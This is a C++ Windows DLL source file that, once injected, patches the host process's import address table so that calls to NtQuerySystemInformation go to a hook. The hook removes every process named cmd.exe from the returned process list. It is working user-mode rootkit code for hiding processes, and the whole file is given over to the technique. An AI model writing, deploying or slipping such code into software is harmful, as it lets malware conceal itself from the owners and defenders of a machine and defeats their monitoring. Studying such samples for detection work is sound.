// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <winternl.h>
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
typedef struct _MY_SYSTEM_PROCESS_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER Reserved[3];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	ULONG BasePriority;
	HANDLE ProcessId;
	HANDLE InheritedFromProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI *PNT_QUERY_SYSTEM_INFORMATION)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);


PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation =
(PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandle("ntdll"),
	"NtQuerySystemInformation");

// Hooked function
NTSTATUS WINAPI HookedNtQuerySystemInformation(
	__in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout    PVOID                    SystemInformation,
	__in       ULONG                    SystemInformationLength,
	__out_opt  PULONG                   ReturnLength
)
{
	NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);
	if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
	{
		// Loop through the list of processes
		PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
		PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)
			SystemInformation;

		do
		{
			pCurrent = pNext;
			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->
				NextEntryOffset);
			if (!wcsncmp(pNext->ImageName.Buffer, L"cmd.exe", pNext->ImageName.Length))
			{
				if (!pNext->NextEntryOffset)
				{
					pCurrent->NextEntryOffset = 0;
				}
				else
				{
					pCurrent->NextEntryOffset += pNext->NextEntryOffset;
				}
				pNext = pCurrent;
			}
		} while (pCurrent->NextEntryOffset != 0);
	}
	return status;
}

void PatchIAT() {
	OutputDebugStringW(L"Start IAT");

	HMODULE base = GetModuleHandle(NULL);

	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;
	PIMAGE_NT_HEADERS image_nt_header = (PIMAGE_NT_HEADERS)((DWORD_PTR)base + dos_header->e_lfanew);

	PIMAGE_IMPORT_DESCRIPTOR image_import_descriptor = NULL;
	IMAGE_DATA_DIRECTORY image_data_directory = image_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	image_import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)base + image_data_directory.VirtualAddress);

	LPCSTR dll_name = NULL;

	while (image_import_descriptor->Name != NULL) {
		dll_name = (LPCSTR)((DWORD_PTR)base + image_import_descriptor->Name);

		if (lstrcmp(dll_name, "NTDLL.DLL") == 0 || lstrcmp(dll_name, "ntdll.dll") == 0 || lstrcmp(dll_name, "Ntdll.dll") == 0) {
			OutputDebugStringW(L"ntdll was found");

			PIMAGE_THUNK_DATA origin_image_thunk_data = (PIMAGE_THUNK_DATA)((DWORD_PTR)base + image_import_descriptor->OriginalFirstThunk);
			PIMAGE_THUNK_DATA image_thunk_data = (PIMAGE_THUNK_DATA)((DWORD_PTR)base + image_import_descriptor->FirstThunk);

			while (origin_image_thunk_data != NULL) {

				PIMAGE_IMPORT_BY_NAME image_import_by_name = NULL;
				image_import_by_name = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)base + origin_image_thunk_data->u1.AddressOfData);

				if (image_import_by_name != NULL) {
					LPCSTR function_name = NULL;
					function_name = image_import_by_name->Name;



					if (lstrcmp(function_name, "NtQuerySystemInformation") == 0) {
						OutputDebugStringW(L"nt query was found.");

						DWORD old_protect, IDontCare;
						MEMORY_BASIC_INFORMATION old_privelage;
						VirtualQuery((LPVOID)(&image_thunk_data->u1.Function), &old_privelage, sizeof(old_privelage));
						VirtualProtect(old_privelage.BaseAddress, old_privelage.RegionSize, PAGE_READWRITE, &old_privelage.Protect);
						image_thunk_data->u1.Function = (DWORD_PTR)HookedNtQuerySystemInformation;
						VirtualProtect(old_privelage.BaseAddress, old_privelage.RegionSize, old_privelage.Protect, &IDontCare);

						break;
					}
					origin_image_thunk_data++;
					image_thunk_data++;

				}
			}
		}
		image_import_descriptor++;
	}
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
	{
		OutputDebugStringW(L"DllMain");
		PatchIAT();
		OutputDebugStringW(L"IATPatching DllMain end");
	}
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

